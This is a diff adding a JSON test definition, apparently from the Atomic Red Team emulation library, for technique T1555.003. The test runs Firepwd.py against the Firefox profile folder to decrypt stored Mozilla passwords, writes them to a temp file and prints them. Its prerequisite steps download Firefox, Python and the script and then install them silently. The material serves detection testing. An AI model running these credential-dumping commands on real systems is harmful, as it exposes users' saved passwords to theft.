@@ -1,0 +1,87 @@
+{
+    "name": "Decrypt Mozilla Passwords with Firepwd.py",
+    "description": "Firepwd.py is a script that can decrypt Mozilla (Thunderbird, Firefox) passwords. Upon successful execution, the decrypted credentials will be output to a text file, as well as displayed on screen.   Will create a Python virtual environment within the External Payloads folder that can be deleted manually post test execution. ",
+    "supported_platforms": [
+        "windows"
+    ],
+    "dependency_executor_name": "powershell",
+    "executor": {
+        "name": "powershell",
+        "command": "$PasswordDBLocation = get-childitem -path \"$env:appdata\\Mozilla\\Firefox\\Profiles\\*.default-release\\\"\ncmd /c #{venv_path}\\Scripts\\python.exe #{Firepwd_Path} -d $PasswordDBLocation > #{Out_Filepath}\ncat #{Out_Filepath}\n",
+        "cleanup_command": "Remove-Item -Path \"#{Out_Filepath}\" -erroraction silentlycontinue   \n",
+        "type": "Command Executor"
+    },
+    "id": "T1555.003",
+    "tactics": [
+        "Credential Access"
+    ],
+    "technique": "Credentials from Web Browsers",
+    "source": "ART",
+    "uuid": "dc9cd677-c70f-4df5-bd1c-f114af3c2381",
+    "arguments": {
+        "Firepwd_Path": {
+            "description": "Filepath for Firepwd.py",
+            "type": "string",
+            "default": "PathToAtomicsFolder\\..\\ExternalPayloads\\venv_t1555.004\\Scripts\\Firepwd.py"
+        },
+        "Out_Filepath": {
+            "description": "Filepath to output results to",
+            "type": "string",
+            "default": "$env:temp\\T1555.003Test8.txt"
+        },
+        "VS_CMD_Path": {
+            "description": "Filepath to Visual Studio Build Tools Command prompt",
+            "type": "string",
+            "default": "C:\\Program Files (x86)\\Microsoft Visual Studio\\2022\\BuildTools\\VC\\Auxiliary\\Build\\vcvars64.bat"
+        },
+        "Python_Path": {
+            "description": "Filepath to python",
+            "type": "string",
+            "default": "C:\\Program Files\\Python310\\python.exe"
+        },
+        "venv_path": {
+            "description": "Path to the folder for the tactics venv",
+            "type": "string",
+            "default": "PathToAtomicsFolder\\..\\ExternalPayloads\\venv_t1555.004"
+        }
+    },
+    "preconditions": [
+        {
+            "description": "Firefox profile directory must be present\n",
+            "prereq_command": "if (get-childitem -path \"$env:appdata\\Mozilla\\Firefox\\Profiles\\*.default-release\\\" -erroraction silentlycontinue) {exit 0} else {exit 1}\n",
+            "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://ftp.mozilla.org/pub/firefox/releases/98.0/win64/en-US/Firefox%20Setup%2098.0.msi\" -outfile \"PathToAtomicsFolder\\..\\ExternalPayloads\\firefox.msi\"\nmsiexec.exe /i \"PathToAtomicsFolder\\..\\ExternalPayloads\\firefox.msi\" /quiet\nsleep -s 30\nstart-process \"$env:programfiles\\Mozilla Firefox\\firefox.exe\".\nsleep -s 5\nstop-process -name \"firefox\"\n"
+        },
+        {
+            "description": "Visual Studio Build Tools command prompt must exist at #{VS_CMD_Path}\n",
+            "prereq_command": "if (Test-Path \"#{VS_CMD_Path}\") {exit 0} else {exit 1}\n",
+            "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction ignore -Force | Out-Null\ninvoke-webrequest \"https://aka.ms/vs/17/release/vs_BuildTools.exe\" -outfile \"PathToAtomicsFolder\\..\\ExternalPayloads\\VS_BuildTools.exe\"\nwrite-host \"Visual Studio Build Tools (Desktop Development with C++) must be installed manually. Please run the installer from PathToAtomicsFolder\\..\\ExternalPayloads\\VS_BuildTools.exe.\"\n"
+        },
+        {
+            "description": "Python must be installed\n",
+            "prereq_command": "if (Test-Path \"#{Python_Path}\") {exit 0} else {exit 1}\n",
+            "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction ignore -Force | Out-Null\ninvoke-webrequest \"https://www.python.org/ftp/python/3.10.4/python-3.10.4-amd64.exe\" -outfile \"PathToAtomicsFolder\\..\\ExternalPayloads\\python_setup.exe\"\nStart-Process -FilePath \"PathToAtomicsFolder\\..\\ExternalPayloads\\python_setup.exe\" -ArgumentList \"/quiet InstallAllUsers=1 PrependPath=1 Include_test=0\" -Wait\n"
+        },
+        {
+            "description": "Computer must have venv configured at #{venv_path}\n",
+            "prereq_command": "if (Test-Path -Path \"#{venv_path}\") { exit 0 } else { exit 1 }\n",
+            "get_prereq_command": "py -m venv \"#{venv_path}\"\n"
+        },
+        {
+            "description": "Firepwd must exist at #{Firepwd_Path}\n",
+            "prereq_command": "if (Test-Path \"#{Firepwd_Path}\") {exit 0} else {exit 1}\n",
+            "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction ignore -Force | Out-Null\nInvoke-WebRequest \"https://raw.githubusercontent.com/lclevy/firepwd/167eabf3b88d5a7ba8b8bc427283f827b6885982/firepwd.py\" -outfile \"#{Firepwd_Path}\"\n"
+        },
+        {
+            "description": "Pycryptodome library must be installed \n",
+            "prereq_command": "if (#{venv_path}\\Scripts\\pip.exe show pycryptodome) {exit 0} else {exit 1}\n",
+            "get_prereq_command": "if (test-path \"#{VS_CMD_Path}\"){#{venv_path}\\Scripts\\pip.exe install pycryptodome | out-null | cmd /c %comspec% /k \"#{VS_CMD_Path}\" | out-null} else {write-host \"Visual Studio Build Tools (C++ Support) must be installed to continue gathering this prereq\"}\n"
+        },
+        {
+            "description": "Pyasn1 library must be installed \n",
+            "prereq_command": "if (#{venv_path}\\Scripts\\pip.exe show pyasn1) {exit 0} else {exit 1}\n",
+            "get_prereq_command": "if (test-path \"#{VS_CMD_Path}\") & {#{venv_path}\\Scripts\\pip.exe install pyasn1 | out-null | cmd /c %comspec% /k \"#{VS_CMD_Path}\" | out-null} else {write-host \"Visual Studio Build Tools (C++ Support) must be installed to continue gathering this prereq.\"}\n"
+        }
+    ],
+    "infrastructure_requirement": [],
+    "side": "Victim"
+}
